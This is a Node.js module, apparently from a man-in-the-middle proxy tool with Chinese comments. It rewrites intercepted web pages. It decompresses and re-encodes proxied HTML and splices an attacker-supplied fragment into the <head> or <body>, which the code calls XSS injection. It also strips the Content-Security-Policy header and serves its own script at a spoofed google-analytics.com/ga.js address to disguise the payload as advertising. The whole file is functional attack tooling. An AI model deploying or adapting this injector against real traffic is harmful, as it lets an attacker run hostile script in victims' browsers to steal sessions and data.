'use strict';

var zlib = require('zlib'),
	iconv = require('iconv-lite');


// 资源路径
var PATH = __dirname + '/asset/';

// 外部脚本 URL（伪装成广告）
var EXTERN_URL = 'http://google-analytics.com/ga.js',
	EXTERN_SYMBOL = '$EXTERN_JS';

// 外部脚本 内容
var FILE_EXTERN = PATH + 'extern.js';

// 注入网页的 HTML 内容
var FILE_FRAG = PATH + 'frag.html';


var mApp,
	mExternJs,
	mFrag;


exports.init = function(app) {
	mApp = app;
	initInjector();
	initExternJs();
	return true;
};


function initInjector() {
	// 注入的内容
	mFrag = mApp.util.readText(FILE_FRAG);
	if (!mFrag) {
		mApp.util.err('fail load inject content');
		return;
	}

	// 填充外部脚本路径
	mFrag = mFrag.replace(EXTERN_SYMBOL, EXTERN_URL);
	mFrag = '$&' + mFrag;
	
	mApp.msg.on('WebResBegin', handleWebResBegin);
}


function initExternJs() {
	// 外部脚本内容
	mExternJs = mApp.util.readJs(FILE_EXTERN, mApp.param.debug);
	mExternJs = new Buffer(mExternJs);

	mApp.msg.on('WebReqBegin', handleWebReqBegin);
}


/**
 * 提供外部脚本内容
 */
function handleWebReqBegin(e) {
	if (EXTERN_URL == e.fullUrl) {
		e.output(200, {
			'content-type': 'text/javascript; charset=utf-8',
		}, mExternJs);

		return false;
	}
}

/**
 * 注入代理返回的网页
 */
function handleWebResBegin(e) {
	//
	// 很多网站使用 gzip + chunk 传输网页，并且使用 gbk 编码，
	// 全部接收完再注入比较方便。
	//
	var serverRes = e.serverRes,
		resHeader = serverRes.headers || {},
		mime = resHeader['content-type'] || '';

	if (!/html/i.test(mime)) {
		return;
	}
	//
	// gzip 数据解压
	//
	var svrEnc = resHeader['content-encoding'];
	var stream = serverRes;

	if (svrEnc) {
		if (/gzip/i.test(svrEnc)) {
			stream = serverRes.pipe( zlib.createGunzip() );
		}
		else if (/deflate/i.test(svrEnc)) {
			stream = serverRes.pipe( zlib.createInflateRaw() );
		}
	}
	//
	// 接收数据块到缓冲区
	//
	var chunks = [];
	var bytes = 0;

	stream.on('data', function(chunk) {
		chunks.push(chunk);
		bytes += chunk.length;
	});

	stream.on('end', function() {
		var data;
		if (bytes > 0) {
			data = Buffer.concat(chunks, bytes);

			// 整个网页接收完成，注入！
			var charset = mime.match(/charset=(.+)/i);
			if (charset) {
				charset = charset[1];
			}
			data = inject(data);

            // 删除 CSP 安全策略
            delete resHeader['content-security-policy'];
		}
		// 输出注入后内容
		e.output(serverRes.statusCode, resHeader, data);
	});

	return false;
}

/**
 * HTML 注入操作
 */
function inject(data, charset) {

	var text = data.toString();
	//
	// 正常的html起始元素
	//
	if (! /^\s*(<!|<html|<script|<img|<p)/i.test(text) ) {
		return data;
	}
	//
	// 优先使用<meta>标签里的charset标记：
	//   <meta charset="utf-8" />
	//   <META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=GBK">
	//
	var val = text.match(/<meta\s+[^>]*charset=['"]?([\w\-]*)/i);
	if (val) {
		charset = val[1];
	}

	// 将html二进制数据转为 utf-8字符
	charset = charset ? charset.toLowerCase() : 'utf-8';

	if (charset != 'utf-8') {
		try {
			text = iconv.decode(data, charset);
		} catch(e) {
			return data;
		}
	}

	// 注入XSS
	text = injectXSS(text);
	
	// 转回二进制数据
	return (charset == 'utf-8') ?
		new Buffer(text) :
		iconv.encode(text, charset);
}

function injectXSS(html) {
	return html.replace(/<head>|<body>/i, mFrag);
}
